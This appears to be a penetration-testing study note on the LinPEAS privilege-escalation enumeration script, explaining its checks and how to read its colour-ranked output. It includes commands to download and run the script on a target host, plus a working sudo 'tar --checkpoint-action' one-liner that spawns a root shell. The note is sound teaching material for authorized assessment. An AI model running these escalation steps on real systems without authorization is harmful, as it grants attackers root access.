---
title: "LinPEAS"
aliases: ["linpeas", "PEASS-ng"]
tags: [tree/tooling, cyber/tooling/offensive/privesc/linpeas, type/tool, level/root]
Domain: "[[Privilege Escalation Enumeration Tools]]"
Color: "#708090"
---

# LinPEAS

LinPEAS (part of PEASS-ng) is *the* Linux privilege-escalation enumeration script. Dropped onto a compromised host, it inspects hundreds of local vectors — SUID binaries, sudo rules, cron jobs, writable paths, kernel version, capabilities, cleartext credentials — and prints a **colour-ranked** report so you can jump straight to the likely path to root. It is read-only reconnaissance; it changes nothing.

> [!warning] Authorized post-exploitation only
> Run only on hosts you are authorized to assess. LinPEAS is noisy (thousands of reads and commands) and will appear in host telemetry.

## Parent Learning Order
LinPEAS -> WinPEAS

## Crook — The Mental Model

Escalating from a normal user to root means finding **one thing that is misconfigured to trust you more than it should**: a program that runs as root but you can influence, a file root reads that you can write, or a kernel old enough to have a known exploit. The vectors are always the same handful of categories.

![[tool_privesc_surface.svg]]

The left column of the diagram is LinPEAS's entire checklist. You do not memorise commands for each — LinPEAS runs them all — but you must recognise the categories so you can *read the output*: a writable SUID binary means "check GTFOBins," a `NOPASSWD` sudo rule means "run that command as root," an old kernel means "look up a CVE."

## Operator — Make It Work

Get the script onto the host (it is a single self-contained shell script) and run it, teeing the output for evidence:

```shell-session
low@target:/tmp$ curl -sL https://.../linpeas.sh -o linpeas.sh   # or serve from your box
low@target:/tmp$ chmod +x linpeas.sh && ./linpeas.sh -a | tee linpeas.out
╔══════════╣ Interesting SUID files
   /usr/bin/find  (root)  ═══> exploitable via GTFOBins
╔══════════╣ Checking sudo -l
   (root) NOPASSWD: /usr/bin/tar
╔══════════╣ Kernel
   Linux 4.4.0-116  →  [CVE-2017-16995 candidate]
╔══════════╣ Readable /etc/… & creds
   /var/www/config.php:  db_pass = 'Summer2024'
```

LinPEAS **highlights** the high-value lines (red/yellow on a real terminal): `find` is SUID-root (a GTFOBins escape), `tar` runs via passwordless sudo (another GTFOBins escape), and a config file leaks a DB password. Each highlighted line is a candidate path. Convert one immediately:

```shell-session
low@target:/tmp$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

The passwordless-sudo `tar` became a root shell via its `--checkpoint-action` — one of LinPEAS's highlighted findings, exploited deliberately.

## Root — Internals & The Deliberate Break

LinPEAS ranks findings with a colour scheme, and the single most important skill is reading that ranking correctly:

```shell-session
low@target:/tmp$ ./linpeas.sh | grep -i 'RED\|99%'
   [95%+ PE] /usr/bin/find is SUID (GTFOBins escape)
low@hardened:/tmp$ ./linpeas.sh -a | grep -c '95%'
0
```

**The deliberate break / contrast:** on the vulnerable host, LinPEAS flags the SUID `find` at high confidence; on a hardened host the same sweep finds **nothing** at that confidence — the SUID bit is stripped, sudo is tightly scoped, the kernel is patched. But note the trap in the *other* direction: LinPEAS colour is a **heuristic, not proof**. A yellow "possible" finding may be a dead end (e.g., a SUID binary with no GTFOBins entry), and a genuinely exploitable path can appear un-highlighted if it is novel. You verify every candidate by hand; LinPEAS narrows 300 checks to 3, it does not exploit for you.

Operational internals: run with `-a` for all checks (slower, thorough) or targeted flags to stay quiet; LinPEAS works even without root by reading what your user can; and because it shells out to many binaries, a locked-down host (no `curl`/`wget`, restricted `/tmp` noexec) forces you to transfer and run it creatively — itself a signal of a well-hardened target.

## Crook → Operator → Root Checkpoint

- **Crook:** What is the one thing every privilege-escalation vector has in common?
- **Operator:** LinPEAS highlights `(root) NOPASSWD: /usr/bin/tar`. Turn it into a root shell and explain why it works.
- **Root:** Explain why LinPEAS's colour ranking is a heuristic, and why a low-confidence line still needs manual verification (both directions of error).

---
> 🔼 Up: [[Privilege Escalation Enumeration Tools]]
